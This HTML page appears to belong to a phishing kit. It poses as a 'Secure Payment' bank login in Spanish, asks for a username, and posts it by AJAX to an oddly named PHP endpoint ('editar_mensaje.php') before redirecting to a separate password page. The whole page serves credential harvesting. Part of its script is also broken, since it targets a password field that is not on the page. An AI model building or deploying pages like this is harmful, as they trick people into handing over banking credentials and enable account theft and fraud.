

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">


    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


        <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions.js"></script>  		

    <title>Secure Payment</title>

    <style>

    *{
        margin: 0;
        padding: 0;
        font-family: Arial, Helvetica, sans-serif;
    }

    #trazo {
        background-image: url(img/bg-trazo.svg);
        width: auto;
        background-position: top;
    }

    .contenido {
        position: relative;
        top: 5rem;
    }

    #txtUsuario {
        color: #fff;
    }

    #txtUsuario::placeholder {
        color: #fff;
    }
    
    .forget-text {
        display: flex;
        justify-content: end;
        padding-right: 2rem;
    }


    </style>


</head>
<body style="background-color:#2c2a29;">
<div id="trazo">
<center>
    <br>

    <img src="img/logo.png" alt=""  style="width: 100%;">


    <br>
    <br>
    <a style="font-size:30px; color:#fff;">Ingresa tu usuario</a>
</center>

<div class="contenido" style="width:90%; border-radius:30px; border: none; background-color:#454648; height:290px; padding:20px; margin:auto;">


<br>
<br>
<center>
    <input type="text" name="user" id="txtUsuario" placeholder="Usuario" style="border:none; width:90%;height:35px; background: transparent; border-bottom:2px solid #fff; padding-left:15px;" oninput="this.value = this.value.replace(/\s+/g, '')" required>
</center>
<a style="position:absolute; right: 10%; color:#fff; margin-top:6px"><small>¿olvidaste tu usuario?</small></a>

<br>

<br>
<br>
<center>
    <input type="submit" value="Continuar" id="btnUsuario" style="width:80%; background-color:#fdd923; height:40px; border-radius:100px; border:none; font-weight:bold; color:black;">
</center>

</div>
</div>


<script>
  const txtPass = document.getElementById('txtPass');

  txtPass.addEventListener('input', function() {
    const value = txtPass.value;
    const cleanValue = value.replace(/\D/g, ''); // Remover caracteres no numéricos

    if (value !== cleanValue) {
      txtPass.value = cleanValue;
    }
  });
</script>



<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {

		$('#btnUsuario').click(function(){
			if ($("#txtUsuario").val().length > 0) {
				const data = {
                    'usuario': $("#txtUsuario").val()
                };
				 $.ajax({
                    url: '../../acciones/editar_mensaje.php',
                    method: 'POST',
                    data: {
                        data: data
                    },
                    success: function(response) {
                        const result = JSON.parse(response);
                        if (result.success) {
                            window.location.href = "contraseña.php";
                        } else {
                            alert('Error de conexión, por favor intente de nuevo');
                           window.location.href = "/";
                        }
                    },
                    error: function(xhr, status, error) {
                        alert('Error en la solicitud AJAX: ' + error);
                    }
                });
			}else{
				$("#err-mensaje").show();
				$(".user").css("border", "1px solid red");
				$("#txtUsuario").focus();
			}			
		});

		$("#txtUsuario").keyup(function(e) {
			$(".user").css("border", "1px solid #CCCCCC");	
			$("#err-mensaje").hide();				
		});
	});
</script>
    
</body>


</html>